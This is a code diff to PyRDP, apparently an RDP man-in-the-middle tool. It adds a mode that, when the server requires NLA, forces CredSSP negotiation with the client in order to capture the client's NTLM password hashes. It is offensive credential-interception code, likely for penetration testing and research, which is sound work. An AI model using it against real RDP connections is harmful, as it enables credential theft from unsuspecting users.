@@ -8,7 +8,7 @@ from typing import Callable, Coroutine, Optional
 from logging import LoggerAdapter
 
 from pyrdp.core import defer
-from pyrdp.enum import NegotiationFailureCode, NegotiationType, NegotiationRequestFlags
+from pyrdp.enum import NegotiationFailureCode, NegotiationType, NegotiationRequestFlags, NegotiationProtocols
 from pyrdp.layer import X224Layer
 from pyrdp.mitm.state import RDPMITMState
 from pyrdp.parser import NegotiationRequestParser, NegotiationResponseParser
@@ -83,6 +83,11 @@ class X224MITM:
             # Tell the server we only support the allowed authentication methods.
             chosenProtocols &= self.state.config.authMethods
 
+        if self.state.ntlmCapture:
+            # If we want to capture the NTLM hash, we need to put back CredSSP in here.
+            # If we don't do that we will not get to the state where we can clone the certificate if needed.
+            chosenProtocols = NegotiationProtocols.SSL | NegotiationProtocols.CRED_SSP
+
         modifiedRequest = NegotiationRequestPDU(
             self.originalNegotiationRequest.cookie,
             self.originalNegotiationRequest.flags,
@@ -99,6 +104,7 @@ class X224MITM:
         Awaits the coroutine that connects to the server.
         :param payload: the connection request payload
         """
+
         await self.connector()
         self.server.sendConnectionRequest(payload = payload)
 
@@ -117,22 +123,31 @@ class X224MITM:
         parser = NegotiationResponseParser()
         response = parser.parse(pdu.payload)
         if isinstance(response, NegotiationFailurePDU):
-            if response.failureCode == NegotiationFailureCode.HYBRID_REQUIRED_BY_SERVER and self.state.canRedirect():
-                self.log.info("The server forces the use of NLA. Using redirection host: %(redirectionHost)s:%(redirectionPort)d", {
-                    "redirectionHost": self.state.config.redirectionHost,
-                    "redirectionPort": self.state.config.redirectionPort
-                })
+            if response.failureCode == NegotiationFailureCode.HYBRID_REQUIRED_BY_SERVER:
 
                 # Disconnect from current server
                 self.disconnector()
 
-                # Use redirection host and replay sequence starting from the connection request
-                self.state.useRedirectionHost()
+                if self.state.canRedirect():
+                    self.log.info("The server forces the use of NLA. Using redirection host: %(redirectionHost)s:%(redirectionPort)d", {
+                        "redirectionHost": self.state.config.redirectionHost,
+                        "redirectionPort": self.state.config.redirectionPort
+                    })
+
+                    # Use redirection host and replay sequence starting from the connection request
+                    self.state.useRedirectionHost()
+                else:
+                    # If we are not configured to redirect then we should capture the NTLM hash
+                    self.log.info("Server requires CredSSP/NLA and we are not configured to support it. Attempting to capture client's NTLM hashes.")
+                    self.state.ntlmCapture = True
+
                 self.onConnectionRequest(self.originalConnectionRequest)
                 return
             else:
                 self.log.info("The server failed the negotiation. Error: %(error)s", {"error": NegotiationFailureCode.getMessage(response.failureCode)})
                 payload = pdu.payload
+        elif self.state.ntlmCapture:
+            payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, NegotiationProtocols.CRED_SSP))
         else:
             payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, response.selectedProtocols))
 
